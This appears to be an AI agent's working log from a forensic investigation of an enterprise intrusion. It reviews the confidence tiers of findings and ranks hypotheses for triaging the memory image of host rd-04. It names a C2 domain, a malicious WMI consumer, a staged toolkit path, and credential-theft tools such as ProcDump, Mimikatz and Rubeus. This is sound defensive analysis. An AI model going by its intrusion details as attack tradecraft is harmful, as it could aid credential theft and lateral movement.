- Ensure report keeps Cobalt Strike strictly SUSPECTED and ProcDump strictly SUSPECTED-credential-access in narrative prose.
- nromanoff→rd-04 origin is inference from toolkit path strings; phrase as "consistent with" not "operated from."

BLOCKERS: tdungan identity/role not cross-referenced against case suspect list; p.exe execution-artifact (Amcache/Prefetch) not cited or marked checked-absent under CONFIRMED claim.

next_hypothesis_triggers: Amcache/Prefetch p.exe entry confirms first-execution timestamp and parent
UserAssist/BAM under tdungan shows ProcDump invocation context
WMI-Activity 5857/5858 binds spsql 4624 to remote WMI call
tdungan appears on case suspect/insider list -> reclassify ProcDump+OneDrive findings as insider vector

entries.conclusion:
LOGIC AND CONFIDENCE REVIEW

1. LOGICAL GAPS
- p.exe delivery mechanism: file is on disk and running in memory, but the write event (which process created C:\Windows\Temp\Perfmon\p.exe, when, from what parent) is not evidenced. The WMI consumer fetches from squirreldirectory.com/a — is p.exe the payload of that fetch? Not shown.
- Link between Empire stager (finding 2) and p.exe loader (finding 1): both exist on rd-01 but the causal chain (Empire -> dropped p.exe) is asserted only in the scope summary, not evidenced.
- spsql credential source: remote WMI from 172.16.4.5 by spsql is LIKELY, but how spsql creds were obtained is not addressed (ProcDump on tdungan host is a different user context).
- nromanoff inbound SMB: noted but no follow-on action on rd-01 attributed to that session (what did nromanoff do after authenticating?).

2. CONTRADICTIONS
- None material. Prior 09-06 re-registration contradiction has been resolved by dropping it as out-of-image.

3. TIER VIOLATIONS
- Finding 3 (WMI persistence) is marked CONFIRMED for the persistence artifact itself (appropriate — __EventFilter + Consumer in OBJECTS.DATA + WMI-Activity 5861 with CreatorSID). The CreatorSID=spsql binding is CONFIRMED-tier. Acceptable.
- Finding 10 (Scope summary) is tiered LIKELY overall, which correctly hedges the chain. Acceptable.
- No CONFIRMED claims rest on YARA-only or single-indicator evidence.

4. TIER CONTRADICTIONS
- spsql remote WMI execution into rd-01: finding 4 is LIKELY, but finding 3 binds CreatorSID=spsql to the persistence at CONFIRMED tier, and finding 10 restates the spsql->rd-01 WMI step inside a LIKELY summary. These are consistent (persistence registration vs. the broader lateral-execution claim) — not a contradiction, but ensure report does not silently upgrade finding 4 to CONFIRMED by leaning on finding 3.
- p.exe execution: CONFIRMED in finding 1, and finding 10 implicitly re-states it at LIKELY tier inside the scope chain. Acceptable as the chain hedge covers causality, not the execution fact.

5. OVERCLAIMED MECHANISMS
- "Empire framework" is held LIKELY in finding 2 — correct; do not let the scope summary's "Empire foothold" phrasing read as CONFIRMED.
- "spsql remote-WMI into rd-01" in finding 10 scope summary should be re-tagged LIKELY inline to match finding 4.
- ProcDump = T1003 credential access: correctly SUSPECTED (no LSASS handle, no .dmp). Ensure report does not narrate "dumped LSASS."
- Lateral toolkit on remote hosts: ShimCache strings on rd-01 evidence only that the paths were referenced from rd-01, not that the remote hosts executed them. Finding 6 wording "remote-host confirmation pending" is correct — keep it.

6. MISSING INVESTIGATION / EVIDENCE EXHAUSTION
- Prefetch (PECmd) and SRUM unavailable — noted, acceptable.
- OBJECTS.DATA ASCII-only — acceptable for the consumer/filter strings already recovered.
- Suspect roster: stated as "no case suspect roster" — acceptable; tdungan unwitting conclusion stands.
- Event log channels: 4624/4104/WMI-Activity cited. Was Security 4688 (process creation) reviewed for the p.exe spawn, and Sysmon (if present) for file-create of p.exe? Not stated. ADVISORY — would tighten p.exe delivery.
- Amcache explicitly checked for p.exe (absent, noted). AppCompatCache cited. RecentFileCache not mentioned — ADVISORY.
- nromanoff session follow-through on rd-01 (file access, process spawn under that SID) not characterized. ADVISORY.
- C2 squirreldirectory.com: no pcap available (stated). DNS cache / registry-resolved hosts on rd-01 not mentioned as checked — ADVISORY.

PUNCH LIST

ADVISORIES (note in report, not blocking):
- A1. p.exe file-write provenance not evidenced; delivery mechanism inferred from WMI consumer URL. State as inference.
- A2. Empire->p.exe causal link is inference; keep scope chain tiered LIKELY.
- A3. nromanoff post-auth activity on rd-01 not characterized.
- A4. spsql credential acquisition path not addressed.
- A5. Confirm Security 4688 / Sysmon coverage for p.exe spawn was reviewed or note as gap.
- A6. DNS cache / resolved-host artifacts for squirreldirectory.com on rd-01 not stated as checked.
- A7. Ensure report phrasing in scope summary does not silently upgrade LIKELY items (Empire, spsql-WMI, lateral toolkit) to CONFIRMED.

No BLOCKERS — prior blockers resolved, tiering is internally consistent, and remaining gaps are appropriately hedged in the findings themselves.

BLOCKERS: None

next_hypothesis_triggers: 4688/Sysmon shows p.exe spawn parent != Empire chain
DNS/registry shows squirreldirectory.com resolution prior to p.exe write
nromanoff SID owns post-auth file/process events on rd-01

entries.content: Evidence check: **rd-04 (172.16.6.14) has a memory image** — investigating it directly. The other three leads (**172.16.4.5/sql01, 172.16.4.6, 172.16.7.15**) have **no images in evidence** → they become collection recommendations (and I can corroborate spsql's 172.16.4.5 origin via the DC if needed). entries.conclusion: VERIFIED: /home/trin/cases/srl-2018-enterprise/evidence/base-rd-04-memory.img sha256=fff9ae72d5222a6f9e8784ce799371bdd4d876ffd73b661edfeb0b8dbde229f8

Analysis: rd-04 is implicated as the SOURCE of NTLM logons into rd-01 with an attacker toolkit path referenced via UNC (\\172.16.6.14\c$\Windows\Temp\Perfmon\volrest.exe). nromanoff's credentials authenticated those sessions. Evidence is memory-only, so we must triage live process state on rd-04.

Competing hypotheses (ranked):

H1 — rd-04 is compromised; nromanoff creds harvested; attacker pivoted from rd-04 to rd-01 (LIKELIHOOD: HIGH)
- Supports: SMB type-3 logons with toolkit path on rd-04's C$; Perfmon\ directory is attacker convention; rd-04 is an RDS host where token/credential theft (Mimikatz, SteamHash, Rubeus) is plausible after initial foothold.
- Confirm: presence of p.exe/pa.exe/pb.exe/ri.exe/csrss.exe/volrest.exe processes or file paths in memory; PowerShell Empire stager strings; reflective loader patterns (MZ in RX private memory via malfind); beacons to squirreldirectory.com in netscan; LSASS access handles from non-system processes.
- Refute: clean process tree, no Perfmon artifacts, no C2, no injected regions.

H2 — nromanoff is a witting insider running the toolkit interactively from rd-04 (LIKELIHOOD: LOW-MEDIUM)
- Supports: same user across both hosts; toolkit staged under her workstation's C$.
- Confirm: interactive (Type 2/10) session for nromanoff on rd-04 with shell-launched attacker binaries under her token; no injection/process hollowing; toolkit in her profile dirs; no other compromised users or SYSTEM-spawned implants.
- Refute (and this is the key discriminator vs H1): implants running as SYSTEM or under another account, parent chains showing service/scheduled-task/WMI spawn, reflective injection into legitimate processes, multiple compromised user contexts, token impersonation.

H3 — rd-04 itself clean; attacker spoofed/relayed from elsewhere via SMB relay or compromised intermediary using nromanoff's hash (LIKELIHOOD: LOW)
- Supports: would explain rd-01 artifacts without rd-04 malware.
- Confirm/refute: absence of any toolkit, C2, or anomalous PowerShell in rd-04 memory; netscan shows only normal sessions; no outbound to squirreldirectory.com.

H4 — Shared admin/jump host misuse: another user/admin operated from rd-04 using nromanoff's cached creds (LIKELIHOOD: LOW)
- Confirm: multiple active sessions in vol.sessions, RDP inbound to rd-04 prior to lateral move, runas/Seclogon evidence in cmdlines.

Key discriminator between H1 and H2 is process ownership/parentage and session type of the toolkit execution on rd-04: SYSTEM/service-spawned reflective implants under nromanoff token = H1; interactive shell -> toolkit under her session with no injection = H2.

Conclusion direction: Pursue rd-04 memory triage focused on (a) Perfmon toolkit binaries and Empire/CS indicators, (b) session/owner of any malicious process, (c) C2 to squirreldirectory.com, (d) injected regions and LSASS access — these jointly resolve H1 vs H2 and rule out H3/H4.

next_hypothesis_triggers: Toolkit process runs as SYSTEM or non-nromanoff token -> strengthens H1, weakens H2
Interactive Type 2/10 session for nromanoff parenting toolkit with no injection -> elevates H2 (insider)
No Perfmon binaries, no squirreldirectory.com beacon, no injection in memory -> elevates H3 (relay/spoof)
Multiple distinct user sessions or RDP-in to rd-04 before lateral move -> elevates H4
LSASS handle from non-Mimikatz-signed but suspicious process -> credential theft path for H1
Reflective loader / Empire stager strings in memory -> confirms CRIMSON OSPREY toolset on rd-04
